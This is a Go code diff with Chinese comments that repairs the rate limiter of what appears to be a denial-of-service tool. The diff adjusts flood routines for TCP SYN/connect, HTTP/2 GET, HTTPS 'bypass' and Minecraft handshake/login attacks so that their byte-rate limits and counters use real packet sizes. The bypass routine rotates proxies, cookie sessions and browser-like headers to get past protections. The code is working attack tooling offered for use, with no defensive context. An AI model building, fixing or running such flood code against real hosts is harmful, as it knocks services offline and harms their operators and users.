@@ -151,7 +151,14 @@ func (l *rateLimiter) allow(bytes int) bool {
 		l.ppsTokens = min(l.ppsLimit, l.ppsTokens+elapsed*l.ppsLimit)
 	}
 	if l.bpsLimit > 0 {
-		l.bpsTokens = min(l.bpsLimit, l.bpsTokens+elapsed*l.bpsLimit)
+		// 桶容量至少容纳单个请求的字节数：容量小于包大小时令牌永远凑不满，
+		// 该请求会被永久拒绝（Linux tc 同样要求 burst ≥ MTU，否则丢包）。
+		// 长期速率仍严格等于 bpsLimit，抬高容量只影响一次性突发上限。
+		capBps := l.bpsLimit
+		if float64(bytes) > capBps {
+			capBps = float64(bytes)
+		}
+		l.bpsTokens = min(capBps, l.bpsTokens+elapsed*l.bpsLimit)
 	}
 
 	// 先判定两个维度都放行，再一起扣减，避免只扣一个维度造成漂移。
@@ -173,13 +180,32 @@ func (l *rateLimiter) allow(bytes int) bool {
 
 const rateLimiterShards = 16
 
+// shardMinBurstBytes 单个分片字节桶必须能容纳的最小突发（≈ 一个数据包）。
+// 分片预算低于此值时（如熔断降级 12500 B/s ÷ 16 = 781 B < 1400 B 的包），
+// 分片桶永远凑不满一个包 → 该维度下所有发送被永久拒绝（实测：降级期间
+// 完全不发包）。此时退化为单桶：低速率场景锁竞争本就可忽略。
+const shardMinBurstBytes = 1600
+
 type shardedRateLimiter struct {
 	shards [rateLimiterShards]rateLimiter
+	// global 承接"单请求字节数超过单分片桶容量"的请求（分片桶会永久拒绝它们），
+	// 按总速率排队放行。仅 maxBPS > 0 时创建。
+	global *rateLimiter
+	// single 低速率退化：分片桶装不下一个包时用单桶同时管 PPS/BPS。
+	single *rateLimiter
 	cursor atomic.Uint64
 }
 
 func newShardedRateLimiter(maxPPS, maxBPS int64) *shardedRateLimiter {
 	sl := &shardedRateLimiter{}
+	if maxBPS > 0 && float64(maxBPS) < shardMinBurstBytes*rateLimiterShards {
+		// 分片字节预算不足以容纳一个包：单桶（否则限速维度永久拒绝一切发送）
+		sl.single = newRateLimiter(maxPPS, maxBPS)
+		return sl
+	}
+	if maxBPS > 0 {
+		sl.global = newRateLimiter(0, maxBPS)
+	}
 	// 用浮点除法避免 maxPPS < rateLimiterShards 时整数除法截断为 0，
 	// 否则该维度会被 allow() 当作"不限流"静默放大
 	ppsPerShard := float64(maxPPS) / rateLimiterShards
@@ -202,8 +228,16 @@ func (sl *shardedRateLimiter) allow(bytes int) bool {
 	if sl == nil {
 		return true
 	}
+	if sl.single != nil {
+		return sl.single.allow(bytes)
+	}
 	idx := sl.cursor.Add(1) % rateLimiterShards
-	return sl.shards[idx].allow(bytes)
+	shard := &sl.shards[idx]
+	// 单请求超过分片桶容量 → 分片桶必拒，改用全局桶按总速率排队
+	if sl.global != nil && shard.bpsLimit > 0 && float64(bytes) > shard.bpsLimit {
+		return sl.global.allow(bytes)
+	}
+	return shard.allow(bytes)
 }
 
 var globalShardedLimiter atomic.Value
@@ -1241,7 +1275,11 @@ func StartTCPFloodEx(cfg AttackConfig) *AttackSession {
 
 					addr := targets[int(atomic.AddUint64(&targetIdx, 1))%len(targets)]
 
-					if !s.checkRate(1) {
+					// 字节维度必须按实际线速字节计（此前 checkRate(1) 让 BPS
+					// 限速形同虚设，BytesSent 也少记）。此处走 Dial 完整握手
+					// （SYN+SYN-ACK+ACK+FIN ≈ 120B）。
+					const tcpHandshakeBytes = 120
+					if !s.checkRate(tcpHandshakeBytes) {
 						time.Sleep(time.Millisecond * 10)
 						continue
 					}
@@ -1256,7 +1294,7 @@ func StartTCPFloodEx(cfg AttackConfig) *AttackSession {
 					case mode == "syn" || mode == "connect":
 						conn.Close()
 						atomic.AddUint64(&s.Stats.PacketsSent, 1)
-						atomic.AddUint64(&s.Stats.BytesSent, 1)
+						atomic.AddUint64(&s.Stats.BytesSent, tcpHandshakeBytes)
 					case reuseConn:
 						for sent := 0; sent < 50 && time.Since(endTime) < 0; sent++ {
 							select {
@@ -1714,14 +1752,15 @@ func StartHTTP2FloodEx(cfg AttackConfig) *AttackSession {
 						tgt = "http://" + tgt
 					}
 
-					if !s.checkRate(1) {
-						time.Sleep(time.Millisecond * 10)
-						continue
-					}
-
 					req := buildL7Request("GET", tgt, nil, rng)
 					reqBytes := estimateRequestBytes("GET", req.URL.String(), nil, req.Header.Get("User-Agent"))
 					req.Proto = "HTTP/2.0"
+
+					// 按实际请求字节限速（BPS 维度真正生效；checkRate(1) 只限 PPS）
+					if !s.checkRate(reqBytes) {
+						time.Sleep(time.Millisecond * 10)
+						continue
+					}
 
 					sem <- struct{}{}
 					fwg.Add(1)
@@ -1823,11 +1862,6 @@ func StartHTTPSBypassEx(cfg AttackConfig) *AttackSession {
 						}
 					}
 
-					if !s.checkRate(1) {
-						time.Sleep(time.Millisecond * 10)
-						continue
-					}
-
 					client := clients[ci]
 					// 死代理即时切换：连续 3 次失败立即换新代理+新 cookie 会话
 					if failStreak[ci] >= 3 {
@@ -1844,6 +1878,12 @@ func StartHTTPSBypassEx(cfg AttackConfig) *AttackSession {
 					// 随机特征请求（Chrome 头 + UA 轮换）
 					req := buildBypassRequest(tgt, rng)
 					reqBytes := estimateRequestBytes("GET", req.URL.String(), nil, req.Header.Get("User-Agent"))
+
+					// 按实际请求字节限速（BPS 维度真正生效）
+					if !s.checkRate(reqBytes) {
+						time.Sleep(time.Millisecond * 10)
+						continue
+					}
 
 					resp, err := client.Do(req)
 					if err != nil {
@@ -2467,7 +2507,16 @@ func StartMinecraftAttackEx(cfg AttackConfig) *AttackSession {
 
 					addr := targets[int(atomic.AddUint64(&targetIdx, 1))%len(targets)]
 
-					if !s.checkRate(1) {
+					var pkt []byte
+					switch mode {
+					case "handshake":
+						pkt = prebuiltHandshake
+					case "login":
+						pkt = prebuiltLogin
+					}
+
+					// 按实际发送字节限速（BPS 维度真正生效）
+					if !s.checkRate(len(pkt)) {
 						time.Sleep(time.Millisecond * 10)
 						continue
 					}
@@ -2476,14 +2525,6 @@ func StartMinecraftAttackEx(cfg AttackConfig) *AttackSession {
 					if err != nil {
 						atomic.AddUint64(&s.Stats.Errors, 1)
 						continue
-					}
-
-					var pkt []byte
-					switch mode {
-					case "handshake":
-						pkt = prebuiltHandshake
-					case "login":
-						pkt = prebuiltLogin
 					}
 
 					// WriteDeadline：防止目标不消费数据时 Write 永久阻塞
